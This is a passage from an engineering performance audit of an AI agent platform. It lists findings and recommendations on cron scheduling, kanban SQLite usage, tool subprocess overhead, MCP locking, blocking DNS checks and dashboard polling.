- **Recommendation:** Make rescan trigger _start_background_scan() and return 202 with the scan status, since the UI already polls /scan-status. If it has to stay synchronous, change it to a plain 'def' handler, or 'await asyncio.to_thread(evaluate_all, force=True)', and guard it with the existing scan lock.

### plugins-cron-5. Kanban _conn() calls init_db() on every request, which defeats the initialized-path fast path — High

- **Location:** `plugins/kanban/dashboard/plugin_api.py:133; hermes_cli/kanban_db.py:1881-1908`
- **Effort / confidence:** S / high
- **Description:** Almost every kanban dashboard handler gets its connection through _conn(), and _conn() first calls kanban_db.init_db(board=board). init_db() removes the path from _INITIALIZED_PATHS before reconnecting. So each board API request re-enters schema/migration setup and the first-connect integrity checks under the SQLite init lock, rather than taking the cheap connect() path. The extra synchronous work lands on every board load, and the frontend triggers board loads on each burst of WebSocket events.
- **Recommendation:** Run init_db() once per board per process, at startup or on first use, keeping a set of boards already initialized. After that, have _conn() call kanban_db.connect(board=board) directly. Keep the forced re-initialization only for explicit repair or migration commands.

### plugins-cron-6. Each kanban WebSocket client opens a new SQLite connection and polls every 300 ms — Medium

- **Location:** `plugins/kanban/dashboard/plugin_api.py:2177-2209`
- **Effort / confidence:** M / high
- **Description:** stream_events() loops for as long as the socket stays open. Each pass calls _fetch_new() through asyncio.to_thread, and _fetch_new() runs kanban_db.connect(), executes a query and closes the connection. The loop then sleeps for _EVENT_POLL_SECONDS (0.3 s). That works out to about 3.3 connection open/query/close cycles and thread-pool hops per second for each open browser tab, even when the board is idle. It uses CPU continuously, takes slots in the default executor, and adds WAL read pressure that competes with dispatcher writes.
- **Recommendation:** Use a single tailer per board in the process that polls (or watches the WAL/mtime) on a reused connection and fans events out to subscriber queues. Alternatively, publish events in-process from the write path. If per-client polling stays, back off adaptively when idle (for example 0.3 s up to 2-5 s) and reuse one read connection per socket.

### plugins-cron-7. Cron tick rewrites and fsyncs the whole jobs.json once for each due job — Medium

- **Location:** `cron/scheduler.py:3228-3240; cron/jobs.py:641-705,1389-1410`
- **Effort / confidence:** M / high
- **Description:** tick() loops over the due jobs and calls advance_next_run() for each one. Each call takes the cross-process jobs lock, loads and parses all of jobs.json, updates one record, re-serializes everything with indent=2, fsyncs, and does an atomic replace. Later lifecycle calls, such as marking a run, repeat the same full load/save. With N jobs due in one tick, cost grows as N × document size, plus N fsyncs, all while holding a lock that the CLI and gateway also need. The impact is small at today's job counts but grows quadratically during schedule bursts such as top-of-hour jobs.
- **Recommendation:** Advance next_run_at for all due jobs in a single locked load/modify/save before dispatching them, and serialize compactly. If job counts grow, move scheduler state into SQLite with an index on next_run_at.

### plugins-cron-8. Cron parallelism is unbounded by default and there is no admission control for distinct due jobs — Medium

- **Location:** `hermes_cli/config.py:2659; cron/scheduler.py:364-376,3243-3259`
- **Effort / confidence:** S / high
- **Description:** max_parallel_jobs defaults to None, and the tick code converts both 0 and None into an unbounded max_workers. ThreadPoolExecutor(max_workers=None) means min(32, cpu+4) workers, and the executor's internal queue has no size limit. The in-flight guard only removes duplicates of the same job ID. When many distinct jobs come due together, they can each start a full AIAgent turn, with its model calls, tool subprocesses, memory connections and browser sessions, all at once on the single box. That causes memory and CPU spikes and pressure on Supabase connections.
- **Recommendation:** Ship a finite default such as 2-4, sized to the box. Defer jobs beyond that cap to the next tick rather than queueing them without limit, and log when jobs are deferred.

### plugins-cron-9. Achievements scan loads every session without a limit, then reads messages one session at a time (N+1) — Medium

- **Location:** `plugins/hermes-achievements/dashboard/plugin_api.py:604-650`
- **Effort / confidence:** L / medium
- **Description:** scan_sessions() calls list_sessions_rich() with no effective limit, then calls db.get_messages(sid) once for each session whose fingerprint changed. On a cold start, or after a fingerprint or schema change, this turns into thousands of sequential SQLite queries that each load a whole transcript. It also keeps the full session list and per-session stats in memory. The background thread keeps request latency low, but the scan still competes for disk and CPU with live agent turns that write to the same state.db.
- **Recommendation:** Compute per-session aggregates in SQL (counts, tool names, and so on), or batch get_messages over chunks of session IDs. Process sessions in bounded batches and persist the derived aggregates incrementally, keyed by the session's last message ID.

### plugins-cron-10. Every Supabase connection runs lazy-deps ensure(), which re-scans installed package metadata without caching — Low

- **Location:** `hermes_cli/datastore.py:106,448; tools/lazy_deps.py:521-548,746-770`
- **Effort / confidence:** S / medium
- **Description:** Every datastore connect() calls ensure('datastore.supabase'). That runs feature_missing() and then _is_satisfied() for each spec, which calls importlib.metadata.version(pkg). Each version() call walks sys.path distributions and parses the metadata, and nothing is memoized. The memory provider connects several times per turn (initialize, prefetch, task discovery), so this repeats filesystem metadata scans on the hot path. Each scan is cheap on its own, but the cost is avoidable.
- **Recommendation:** Memoize a successful ensure(feature) for each process (for example with a module-level set of satisfied features), and clear it only after a lazy install runs.

## tools-exec

The execution-tool layer is mostly CPU/IO-careful in its in-process structures: config reads are mtime-cached, regex tables are precompiled, read-tracker / file-state / console-event containers are capped, and the local wait loop uses adaptive 5ms→200ms polling. The main cost centres are subprocess fan-out and repeated whole-artifact work: every file tool primitive is a full `bash -c` spawn that sources and re-dumps the env snapshot, so a single read_file costs 4 spawns and a patch ~4-6; the opt-in checkpoint manager rewrites 20 commits and runs `git gc --prune=now` plus a full-store rglob on every checkpoint once the snapshot cap is reached; non-local backends poll by re-`cat`-ing entire logs / RPC directories through wrapped `env.execute()` calls every 2s / 100ms. Smaller issues are quadratic string buffering in the background-process reader, an extra `sudo -n true` probe per sudo command, un-pooled HTTP to Camofox, an auxiliary-LLM call for every >8K browser snapshot when user_task is set, and module-level per-task dicts that are never evicted in the long-lived gateway. No prompt-cache-invalidating behaviour was found in this area (tool_result_storage only touches the current turn's results).

**Strengths:** Config reads (read_raw_config/load_config) are cached on (mtime_ns,size); tool_output_limits, env_passthrough, browser engine/provider/timeouts are all memoised at module level.; Approval DANGEROUS/HARDLINE pattern tables are precompiled once (approval.py:489, 792) and _home_prefix_fold_regex is lru_cached.; LocalEnvironment._wait_for_process uses select()-based draining and adaptive 5ms→200ms poll (environments/base.py:714-778), so short commands return in ms without burning CPU on long ones; execute_code uses the same pattern (code_execution_tool.py:1429-1451).; Background reader uses buffer.read1() for incremental output and caps output_buffer at 200K chars; MAX_PROCESSES=64 with LRU pruning of finished sessions.; Per-task read tracker and FileStateRegistry are bounded (_DEDUP_CAP=1000, _MAX_PATHS_PER_AGENT=4096) and read_file dedups unchanged re-reads with a stub, saving context tokens.; Env cleanup tears down Docker/Modal sandboxes outside _env_lock (terminal_tool.py:1538-1551) so slow teardown doesn't stall concurrent tool calls; screenshot cleanup is throttled to once/hour.; Large tool results are spilled to a file with a preview (tool_result_storage.py) and the turn budget only rewrites current-turn results, preserving the prompt-cache prefix.; FileSyncManager rate-limits remote syncs to once per 5s and skips unchanged files by mtime key / sha256.

### tools-exec-1. Checkpoint steady state rewrites the whole ref chain and runs `git gc --prune=now` + full-store rglob on every checkpoint — Medium

- **Location:** `tools/checkpoint_manager.py:885, tools/checkpoint_manager.py:999-1003, tools/checkpoint_manager.py:1062-1118, tools/checkpoint_manager.py:1120-1127, tools/checkpoint_manager.py:548-576, agent/tool_executor.py:467-487`
- **Effort / confidence:** M / high
- **Description:** ensure_checkpoint() runs before the first write_file/patch (and before any 'destructive' terminal command) in every turn. _take() first walks the working dir with Path.rglob up to 50,001 entries (no excludes, so node_modules/.venv are walked) just to count files, then git add -A / write-tree / commit-tree. Once a project has >max_snapshots (20) commits — i.e. permanently after the 21st turn with an edit — _prune() rebuilds the last 20 commits one by one (3 git spawns each ≈ 60 subprocesses), then `reflog expire --expire=now --all` and `git gc --prune=now` over the SHARED store (all projects), then _enforce_size_cap() rglobs and stats every file of the store. This is synchronous in the agent's tool path, so every editing turn pays seconds of CPU/disk on the 8-vCPU box, multiplied by concurrent users sharing ~/.hermes/checkpoints. Default is checkpoints.enabled=False (hermes_cli/config.py:1300), so impact depends on whether prod/agent-home enables it — confidence on prod impact is medium for that reason.
- **Recommendation:** Make pruning amortised: only call _prune() when count > max_snapshots + slack (e.g. 2x) or once per N minutes, and run `git gc --auto`/`git prune` in a background thread or the existing cron rather than inline. Replace _dir_file_count's rglob with `git ls-files -o --exclude-standard | head -n` or os.scandir with excludes, and cache _dir_size_bytes for the store (or use `git count-objects -v`) instead of a full rglob each take.

### tools-exec-2. Every file-tool primitive is a full wrapped bash spawn that sources and re-dumps the env snapshot; read_file = 4 spawns, write/patch ≈ 4-6 — Medium

- **Location:** `tools/file_operations.py:1076, tools/file_operations.py:1107, tools/file_operations.py:1120, tools/file_operations.py:1133, tools/file_operations.py:920-938, tools/file_operations.py:1520-1572, tools/environments/base.py:491-512, tools/environments/base.py:899-933`
- **Effort / confidence:** M / high
- **Description:** ShellFileOperations._exec() routes through env.execute(), which for the local backend builds a script that `source`s the session snapshot, cd's, evals, then rewrites the snapshot via `export -p > tmp && mv` and `pwd -P > cwd_file` (base.py:491-512) and spawns a fresh `bash -c` with a sanitized env copy. read_file issues four of these sequentially (wc -c, head -c 1000, sed -n, wc -l) plus one more `echo $HOME` for any ~ path (never cached); patch_replace does cat + atomic write + cat verify + stat/lint. Each spawn is ~5-15ms of fork/exec + snapshot I/O and, on docker/ssh/modal backends, a full `docker exec`/SSH/API round trip. File tools are the most frequently called tools, so this adds tens to hundreds of ms per call and also rewrites the snapshot file on every read, creating write contention between concurrent tool calls in the same task.
- **Recommendation:** Collapse read_file into one remote command that emits size, binary sample, page and line count in a delimited envelope (or for local backend read directly with Python open() after path resolution). Add a lightweight `execute(..., snapshot=False)` / raw-exec path for read-only file-ops that skips snapshot source/re-dump and cwd marker writes. Cache $HOME per ShellFileOperations instance like _command_cache.

### tools-exec-3. Background processes on non-local backends re-read the entire log every 2s via two-three wrapped execs, unbounded by log size — Medium

- **Location:** `tools/process_registry.py:974-1029`
- **Effort / confidence:** S / high
- **Description:** _env_poller_loop runs `cat <log>` (whole file) plus a `kill -0` probe every 2 seconds for each background process, each through env.execute() — i.e. a `docker exec`/SSH/Modal round trip that also sources and re-dumps the env snapshot. The full log is transferred and decoded every tick even though only the 200K tail is kept; a chatty dev server/build that produces tens of MB makes every tick move tens of MB and burn CPU on the gateway and the container daemon. With up to 64 tracked processes this is ~64 docker-exec spawns/s at steady state. The delta for watch patterns is computed by string length, which also breaks once the log exceeds what's retained.
- **Recommendation:** Track a byte offset and read only new bytes (`tail -c +$((off+1))` or `dd skip=`), combine the output read, liveness check and exit-code read into a single exec per tick, cap per-tick transfer (e.g. 256KB), and back off the poll interval (2s→10s) for processes with no new output and no watch_patterns.

### tools-exec-4. Remote execute_code RPC polls the sandbox with `ls` every 100ms through env.execute() — Medium

- **Location:** `tools/code_execution_tool.py:781-797, tools/code_execution_tool.py:812-816, tools/code_execution_tool.py:880-905`
- **Effort / confidence:** M / high
- **Description:** For non-local backends, _rpc_poll_loop issues `ls -1 rpc_dir/req_*` via env.execute() every 100ms for the whole lifetime of the script, and each tool call adds 4 more execs (cat request, write base64 response via echo, rm request). On Docker that is ~10 `docker exec` + bash + snapshot re-dump spawns per second per running execute_code, regardless of whether the script makes any tool calls; on Modal/Daytona each is a network API call. A 5-minute script = ~3,000 idle spawns. The response is also embedded base64 in the command string, so large tool results inflate the argv and can hit MAX_ARG_STRLEN (128KB).
- **Recommendation:** Use adaptive backoff for the idle poll (100ms→1-2s when no requests), or replace polling with a single long-lived `inotifywait`/blocking-read helper inside the sandbox; batch read+delete into one exec; ship responses via stdin_data (pipe mode) like tool_result_storage._write_to_sandbox already does where the backend supports it.

### tools-exec-5. Background-process output buffer uses repeated string concatenation + slicing (quadratic copying under the session lock) — Low

- **Location:** `tools/process_registry.py:954-957, tools/process_registry.py:1042-1045`
- **Effort / confidence:** S / high
- **Description:** Each 4KB chunk from a local/PTY child does `output_buffer += chunk` and, once over 200K chars, `output_buffer = output_buffer[-200000:]`. Python str is immutable, so every chunk copies ~200-400KB while holding session._lock; a process emitting 10MB/s of output causes ~2,500 copies/s ≈ 0.5-1 GB/s of memcpy on the gateway thread pool (GIL-bound), and poll/read_log/wait readers contend on the same lock. Up to 64 such sessions can be live.
- **Recommendation:** Store output in a collections.deque of chunks with a running length (pop-left when over cap) or a bytearray ring buffer, and materialise the joined string only in poll/read_log/wait.

### tools-exec-6. browser_snapshot triggers an auxiliary LLM call (up to 4K output tokens) for every snapshot >8K chars when user_task is present — Low

- **Location:** `tools/browser_tool.py:233, tools/browser_tool.py:2986-2987, tools/browser_tool.py:2582-2635`
- **Effort / confidence:** S / medium
- **Description:** SNAPSHOT_SUMMARIZE_THRESHOLD is 8000 chars, which almost every real page's accessibility tree exceeds. When the dispatcher passes user_task, each browser_snapshot sends the full snapshot (potentially 100K+ chars) plus the task to call_llm(task='web_extract', max_tokens=4000) synchronously, adding seconds of latency and a separate paid LLM call per snapshot; browsing workflows call snapshot after most actions. There is no caching for an unchanged page.
- **Recommendation:** Raise the threshold or make it configurable, cap the input sent to the extractor (e.g. truncate to ~40K chars first), and memoise by hash of snapshot_text+user_task so repeated snapshots of the same page don't re-summarise. Consider defaulting to _truncate_snapshot unless the user opts in.

### tools-exec-7. Transient-error retry in terminal_tool sleeps up to 2+4+8s on the worker thread for any non-timeout exception — Low

- **Location:** `tools/terminal_tool.py:2594-2616`
- **Effort / confidence:** S / medium
- **Description:** Any exception from env.execute() whose text doesn't contain 'timeout' is retried with time.sleep(2**retry_count) — including deterministic failures (bad cwd, missing binary in sandbox, permission errors). With max_retries=3 that blocks the agent's tool thread for 14s before returning the error, inflating turn latency and holding the per-session worker.
- **Recommendation:** Retry only on an explicit allowlist of transient error types (connection reset, container-gone, Modal/Daytona transient API errors) and use shorter jittered backoff; return immediately for everything else.

### tools-exec-8. Every sudo-containing command spawns an extra `sudo -n true` probe — Low

- **Location:** `tools/terminal_tool.py:680-703, tools/terminal_tool.py:925`
- **Effort / confidence:** S / high
- **Description:** _transform_sudo_command re-probes NOPASSWD with a blocking subprocess.run(['sudo','-n','true'], timeout=3) on every command that contains sudo when no password is configured/cached. This is intentional (to avoid stale timestamps), but costs a fork/exec + PAM round trip (~10-50ms, up to 3s if PAM is slow) on each such command.
- **Recommendation:** Cache a positive NOPASSWD result for a short TTL (e.g. 60s) keyed by scope, keeping re-probe on failure; or skip the probe when /etc/sudoers.d shows NOPASSWD for the user.

### tools-exec-9. Module-level per-task state in the long-lived gateway is capped per task but never evicted per task — Low

- **Location:** `tools/file_tools.py:699-700, tools/file_tools.py:1144-1148, tools/file_state.py:63-75`
- **Effort / confidence:** S / medium
- **Description:** _read_tracker[task_id] is created on first read and only reset by reset_file_dedup() from compression (agent/conversation_compression.py:918); the terminal cleanup thread clears _file_ops_cache but not _read_tracker. FileStateRegistry._reads is a defaultdict per task_id (each up to 4096 paths) and _path_locks gains a Lock per resolved path with no eviction. In the gateway process serving many sessions/subagents (each with its own task_id) for weeks, these grow with the number of distinct tasks/paths ever seen — slow memory creep rather than an acute leak.
- **Recommendation:** Clear _read_tracker and file_state._reads for a task in the same place _file_ops_cache is cleared (terminal_tool._cleanup_inactive_envs / cleanup_vm), and evict _path_locks entries when unlocked (or use a WeakValueDictionary).

### tools-exec-10. Camofox client opens a new HTTP connection per command (no requests.Session pooling) — Low

- **Location:** `tools/browser_camofox.py:140, tools/browser_camofox.py:404-411, tools/browser_camofox.py:453, tools/browser_camofox.py:463, tools/browser_camofox.py:473, tools/browser_camofox.py:483`
- **Effort / confidence:** S / high
- **Description:** All Camofox calls use module-level requests.get/post/delete, which create and tear down a connection pool per call. Browser workflows issue many small calls (snapshot, click, type, tabs), so each pays TCP (and TLS if remote) setup; on localhost it's small, on a remote Camofox it adds an RTT+handshake per action.
- **Recommendation:** Use a module-level requests.Session (thread-safe for this usage with a lock or per-thread session) with keep-alive and reuse it in _get/_post/_delete.

## tools-net-skills

Most tool hot paths here are bounded on purpose. Large tool results spill to disk above 100K chars, web_extract truncates what the model sees, the Skills Hub index is cached and searched in parallel, Graph downloads stream, and the MCP tool snapshot is only republished when tool names change. The biggest verified risks come from shared state on the single gateway box. Every MCP server holds one asyncio.Lock around all RPCs, so tool calls from all sessions run one at a time, which defeats supports_parallel_tool_calls. Sync, DNS-resolving is_safe_url is called directly inside async gateway coroutines. The per-turn MCP refresh can change the tools= prefix mid-conversation, which goes against the AGENTS.md prompt-cache rule. Smaller costs: Skills Hub makes one GitHub request per file, Graph builds a new httpx client per request, the web extract cache has no eviction, and skill view/telemetry/scan rewrites or rescans files. Local measurements: scan_skill took 0.49-1.46s on the large bundled skills, skill_view took 40-70ms with about 180 skills, and the bump_view+bump_use pair took about 3.5ms.

**Strengths:** tool_result_storage/budget_config spill any result over 100K chars to a file and return a 1.5K preview, so huge SKILL.md files (e.g. pytorch-fsdp, 159K chars) do not land in the context window.; refresh_agent_mcp_tools builds tool definitions outside the lock, publishes atomically, and returns early without touching agent.tools when the name set is unchanged.; url_safety exposes an async wrapper (asyncio.to_thread) for DNS checks from event-loop callers.; web_extract truncates model-facing content and caps stored full text per file.; Skills Hub caches its index and fans out independent source searches in parallel.; Microsoft Graph download_to_file streams bytes to disk instead of buffering them in memory.; The agent-created skill security scan is off by default (skills.guard_agent_created).

### tools-net-skills-1. Per-server MCP _rpc_lock serializes every tool call across all gateway sessions, nullifying supports_parallel_tool_calls — Medium

- **Location:** `tools/mcp_tool.py:1462-1468, tools/mcp_tool.py:3458-3466, tools/mcp_tool.py:4530-4541`
- **Effort / confidence:** S / medium
- **Description:** Each MCPServerTask has one asyncio.Lock, and the call handler holds it for the whole session.call_tool round-trip. The MCP connection is a process-wide singleton in the gateway, so one slow call (e.g. a 30s search) blocks every other session's calls to that server, plus list_tools refreshes. The code applies the lock to HTTP/SSE transports too, describing it as 'conservative per-server ordering', even though those transports multiplex requests. Users who set supports_parallel_tool_calls: true (documented in website/docs/user-guide/features/mcp.md:671) still get strictly serial execution, and latency grows linearly with concurrent users.
- **Recommendation:** Keep the lock for stdio only, or narrow it so only list_tools/refresh is serialized against calls. For HTTP transports, or servers marked parallel-safe, use a per-server asyncio.Semaphore(N) instead of a mutex.

### tools-net-skills-2. Blocking DNS resolution (sync is_safe_url) inside async gateway coroutines — Medium

- **Location:** `gateway/platforms/base.py:541-548, gateway/platforms/base.py:744-746, plugins/platforms/slack/adapter.py:2151-2153, tools/url_safety.py:376-420`
- **Effort / confidence:** S / high
- **Description:** _ssrf_redirect_guard (an httpx async event hook, run on every redirect), cache_image_from_url, and Slack send_image call the synchronous is_safe_url, which calls socket.getaddrinfo, directly on the gateway event loop. A slow or unresponsive resolver (up to the 5s+ resolver timeout, times retries) stalls every platform adapter and session on the box, not just the current request. url_safety already provides an asyncio.to_thread wrapper that these callers skip.
- **Recommendation:** Switch these async callers to the async variant (await is_safe_url_async(...)) or wrap with asyncio.to_thread. Consider a small TTL cache of host->verdict so repeated media/CDN hosts skip re-resolution.

### tools-net-skills-3. Between-turns MCP refresh can change tools= mid-conversation and invalidate the prompt cache — Medium

- **Location:** `agent/turn_context.py:177-195, tools/mcp_tool.py:4826-4837, AGENTS.md:1180-1187`
- **Effort / confidence:** M / medium
- **Description:** Every turn with MCP servers registered calls refresh_agent_mcp_tools, which replaces agent.tools whenever the tool name set changes (a slow server finishing its connection, or a list_changed notification adding or removing tools). Tools sit at the front of the cached prefix, so the next request misses the cache for the whole conversation history. The comment calls this 'cache-safe' because it never mutates an in-flight turn, but it still changes the prefix between turns. AGENTS.md forbids changing toolsets mid-conversation and requires deferred invalidation by default. A server that keeps toggling tools causes a full cache rewrite on many turns of a long session.
- **Recommendation:** Only republish when the conversation has no assistant turns yet (or before the first API call). Otherwise queue the change for the next session or compression boundary, behind an opt-in flag like the /skills --now pattern. Log or meter each mid-session tools change.

### tools-net-skills-4. Skills Hub directory download issues one GitHub API request per file — Medium

- **Location:** `tools/skills_hub.py:866-905`
- **Effort / confidence:** M / high
- **Description:** _download_directory_via_tree fetches the repo tree, then calls _fetch_file_content once per blob, and the recursive fallback does the same. A skill with dozens of reference/template files means dozens of sequential HTTPS round-trips on install or update, using up the unauthenticated 60 requests/hour GitHub limit quickly and holding a worker thread for the whole sequence.
- **Recommendation:** Download one tarball/zipball (or raw.githubusercontent with a bounded thread pool), filter it to the skill path, and enforce bundle size and file-count limits before extracting.

### tools-net-skills-5. Microsoft Graph creates a fresh httpx.AsyncClient per request — Low

- **Location:** `tools/microsoft_graph_client.py:190-215, tools/microsoft_graph_client.py:287-305`
- **Effort / confidence:** S / high
- **Description:** _request and download_to_file each open 'async with httpx.AsyncClient(...)' per call or attempt. That rebuilds the connection pool and repeats TCP and TLS setup for every paginated or follow-up Graph call, adding roughly 50-150ms per call and extra connection churn in Teams/Outlook workflows.
- **Recommendation:** Keep one AsyncClient per MicrosoftGraphClient (or inject a shared one), reuse it for _request and streaming downloads, and close it on shutdown.

### tools-net-skills-6. Web extraction full-text cache grows without eviction — Low

- **Location:** `tools/web_tools.py:366-395`
- **Effort / confidence:** S / high
- **Description:** Each truncated extraction writes the full text to cache/web/<url-hash>. Repeat URLs overwrite their file, but distinct URLs pile up forever: there is no TTL, no total-size budget, and no tie-in to a cleanup job. Disk use on the single box therefore grows steadily with web usage.
- **Recommendation:** Enforce a max age and total byte budget, pruning oldest-mtime files on write or from the existing cache cleanup, or write these files to tool_result_storage's per-session storage instead.

### tools-net-skills-7. Skill telemetry does two full read-modify-fsync-replace cycles per skill_view — Low

- **Location:** `tools/skill_usage.py:500-535, tools/skill_usage.py:579-610, tools/skills_tool.py:1642-1667`
- **Effort / confidence:** S / high
- **Description:** _skill_view_with_bump calls bump_view and then bump_use. Each one takes the file lock, re-reads and parses all of .usage.json, rewrites the whole map, fsyncs, and does an atomic replace. That measured about 3.5ms per pair locally on a small map. Cost scales with the size of the map and with disk latency, and concurrent sessions queue behind the lock.
- **Recommendation:** Merge both into one _mutate call, and/or coalesce counters in memory with periodic flushes; skip fsync for counters.

### tools-net-skills-8. Skill discovery and bare-name lookup rescan and reparse every SKILL.md on each call — Low

- **Location:** `tools/skills_tool.py:604-645, tools/skills_tool.py:1067-1095, tools/skills_tool.py:1232-1235`
- **Effort / confidence:** M / high
- **Description:** _find_all_skills (used by skills_list) and bare-name skill_view walk all skill dirs and read/parse every SKILL.md's frontmatter. skill_view then also rglob('*')s the skill directory. With about 180 skills this measured 40-70ms per call locally, and it grows with large externally mounted skill trees.
- **Recommendation:** Cache a name->path and metadata index keyed on directory mtimes, and invalidate it on sync, install, or remove.

### tools-net-skills-9. skills_guard scan costs about 0.5-1.5s of CPU per scan on large skills — Low

- **Location:** `tools/skills_guard.py:627-673, tools/skill_manager_tool.py:121-145`
- **Effort / confidence:** M / high
- **Description:** scan_skill loops patterns-outer and lines-inner over every file, calling re.search once per pattern per line. Measured locally: 1.24s for optional-skills/mlops/pytorch-fsdp, 1.46s for skills/research/research-paper-writing, 0.49s for skills/creative/p5js. It runs on every hub install, and on every skill_manage create/patch/edit when guard_agent_created is enabled. That is noticeable latency for iterative agent edits, and it occupies a worker thread.
- **Recommendation:** Combine the patterns into one compiled alternation (or per-category alternations with named groups) and scan each file once. On patch, rescan only the changed files.

## web-tui-desktop

The streaming paths are mostly sound. tui_gateway coalesces token frames on a 33 ms timer, offloads long RPC handlers to a bounded pool, and caps the sidecar publisher queue at 256. The desktop renderer queues text deltas instead of re-rendering on every token. The main costs on the single box come from the operator dashboard. Each open Chat tab builds a second full gateway session (AIAgent plus a persistent slash-worker Python subprocess). The PTY child mirrors every per-token frame to /api/pub, even though the listener only uses two event types. Hot polled endpoints (/api/status, /api/sessions, /api/logs) are `async def` handlers that do synchronous YAML, SQLite and file I/O on the uvicorn event loop, which also carries the PTY and WebSocket streams. The PTY bridge holds a default-executor thread per open terminal. Frontend issues are smaller: overlapping 5-10 s polls that keep running in hidden tabs, CSS/index.html re-read on every request with no cache headers, and a single eager bundle (all screens, xterm WebGL, Observable Plot, 17 locales).

**Strengths:** tui_gateway/ws.py coalesces message/reasoning/thinking deltas on a 33 ms timer (_TOKEN_COALESCE_S), so the event loop wakes far less often during streaming.; Long RPC handlers (session.list/resume/branch/compress, shell.exec, slash.exec, completion, project tree) run on a bounded ThreadPoolExecutor (HERMES_TUI_RPC_POOL_WORKERS, default 8), so they don't block the reader.; tui_gateway/event_publisher.py uses a bounded queue (256) with put_nowait and drop-on-full. A slow dashboard subscriber can't block the agent or grow memory without limit.; Desktop renderer batches assistant/reasoning text through queueDelta and flushQueuedDeltas, and flushes before tool events to keep ordering, instead of re-rendering on every token.; Disconnected WebSocket sessions are reaped after a grace period (_WS_ORPHAN_REAP_GRACE_S), and close_on_disconnect sidecars are torn down, so refreshes don't leak slash-worker processes forever.; SessionDB uses SQLite WAL, list_sessions_rich is paginated (limit/offset) and attaches tags in bulk, and /api/logs caps lines (500, or 2000 for filtered reads).; PTY reads (bridge.read) and restart-drain resolution are pushed to an executor instead of blocking the loop outright.; Electron windows use contextIsolation: true, sandbox: true, nodeIntegration: false and a contextBridge preload, so there is no heavyweight Node context in renderers. Update checks run every 30 minutes, not in a tight loop.; Polling hooks consistently clear their intervals and close sockets on unmount.

### web-tui-desktop-1. Each dashboard Chat tab builds a second full gateway session (AIAgent + persistent slash-worker subprocess) just for the sidebar — Medium

- **Location:** `web/src/components/ChatSidebar.tsx:189-192, tui_gateway/server.py:4886, tui_gateway/server.py:4993, tui_gateway/server.py:5252-5263, tui_gateway/server.py:1250-1251`
- **Effort / confidence:** M / medium
- **Description:** ChatPage already runs a PTY child (`hermes --tui`), which has its own gateway session, AIAgent and slash worker. ChatSidebar then opens /api/ws and calls session.create (close_on_disconnect: true, source: 'tool') on the dashboard process. session.create schedules _schedule_agent_build(sid) on a threading.Timer, and that build instantiates a full AIAgent (tool registry, model client, system prompt) and spawns a _SlashWorker Python subprocess. So every open Chat tab or refresh costs one extra agent build plus one extra long-lived Python interpreter (tens of MB RSS and CPU-heavy import time). On a refresh the old one also lingers for the orphan grace period. Most of what the sidebar renders (title and model state) arrives through the /api/events mirror anyway.
- **Recommendation:** Add a lightweight `session.create` mode (e.g. `lazy_agent: true` / `no_worker: true`) that skips _schedule_agent_build and _SlashWorker until a method that needs them is called. Alternatively, serve the sidebar's needs (model/profile info) from plain REST endpoints and drop the sidecar session entirely.

### web-tui-desktop-2. PTY child mirrors every per-token frame to /api/pub; subscriber only uses two event types and important frames can be dropped — Medium

- **Location:** `tui_gateway/entry.py:45-47, tui_gateway/transport.py:201-209, tui_gateway/event_publisher.py:37, tui_gateway/event_publisher.py:94-100, hermes_cli/web_server.py:16332, web/src/components/ChatSidebar.tsx:17-18`
- **Effort / confidence:** S / high
- **Description:** When the publish URL is set, entry.py wraps stdout in TeeTransport(stdio, WsPublisherTransport). TeeTransport.write sends every emitted object to the secondary, including each message.delta, reasoning.delta, thinking.delta and tool.progress frame. Each one is JSON-serialized again, queued, and sent from a drain thread to /api/pub. The dashboard then re-sends each frame to every /api/events subscriber via _broadcast_event, awaiting one subscriber at a time. The only consumer (ChatSidebar) uses session.info and dashboard.new_session_requested. The result is roughly double serialization, an extra WS hop and an extra event-loop task per token per Chat tab, all thrown away. The 256-entry queue is shared with low-volume control events, so a fast stream can fill it and silently drop the session.info frame the sidebar actually needs.
- **Recommendation:** Filter at the source. Give WsPublisherTransport (or TeeTransport) an allowlist of event types the dashboard consumes, or at least exclude the *.delta and tool.progress types. If token mirroring is needed later, coalesce like ws.py does, and give control events their own queue, or never drop them.

### web-tui-desktop-3. /api/status does synchronous YAML parsing, SessionDB open/schema init and a 50-row rich listing on the event loop, polled by every dashboard tab — Medium

- **Location:** `hermes_cli/web_server.py:2225, hermes_cli/web_server.py:2242, hermes_cli/web_server.py:2270, hermes_cli/web_server.py:2323-2325, web/src/hooks/useSidebarStatus.ts:5, web/src/screens/SessionsPage.tsx:853-878`
- **Effort / confidence:** S / high
- **Description:** get_status is `async def` but calls check_config_version() and load_gateway_config(), both of which read and parse YAML config, synchronously. It then constructs a fresh SessionDB() (new sqlite3 connection plus schema/PRAGMA init) and runs list_sessions_rich(limit=50) with its correlated/recursive subqueries, only to count active sessions. All of this runs on the uvicorn event loop thread, the same loop that drives /api/pty output, /api/ws gateway streaming and /api/events broadcast. useSidebarStatus polls it every 10 s for every open dashboard tab, the Sessions page polls it again every 5 s, and SystemPage calls it too. Each call stalls every stream on the box for the duration of the call (milliseconds normally; much longer under WAL write contention, since the SQLite timeout is 1 s).
- **Recommendation:** Make get_status a plain `def` (FastAPI runs it in the threadpool), or wrap the blocking parts in run_in_executor. Reuse a process-level SessionDB/read connection instead of opening one per request. Replace list_sessions_rich(limit=50) with a dedicated `SELECT COUNT(*) ... WHERE ended_at IS NULL AND last_active > ?` query. Cache the config-version and gateway-config results keyed on file mtime.

### web-tui-desktop-4. PTY bridge holds a default-executor thread per open terminal and re-submits a 200 ms blocking read forever — Medium

- **Location:** `hermes_cli/web_server.py:15901, hermes_cli/web_server.py:16510-16516, tui_gateway/ws.py:388`
- **Effort / confidence:** M / medium
- **Description:** For each /api/pty connection, the pump loop calls `await loop.run_in_executor(None, bridge.read, 0.2)` back to back, so one thread of the default executor is permanently busy per open Chat tab. It also wakes 5 times a second even when idle (a select timeout, an executor handoff, then `await asyncio.sleep(0)`). The same default executor backs `asyncio.to_thread(server.dispatch, ...)` for every /api/ws RPC frame (ws.py), every other run_in_executor(None, ...) call (TTS, transcription, profile listing, restart drain), and Starlette's sync-endpoint threadpool. Its size is min(32, cpu+4), so a handful of open terminals plus a few slow RPCs can saturate it, and then gateway RPC and status calls queue behind PTY polling.
- **Recommendation:** Replace the polling read with loop.add_reader(master_fd, ...) feeding an asyncio.Queue, or use a dedicated small ThreadPoolExecutor just for PTY reads, so terminals can't starve RPC dispatch. At minimum, dispatch /api/ws frames on a separate executor from PTY I/O.

### web-tui-desktop-5. /api/sessions and /api/logs do synchronous SQLite and file I/O inside async handlers, polled every 5 s — Low

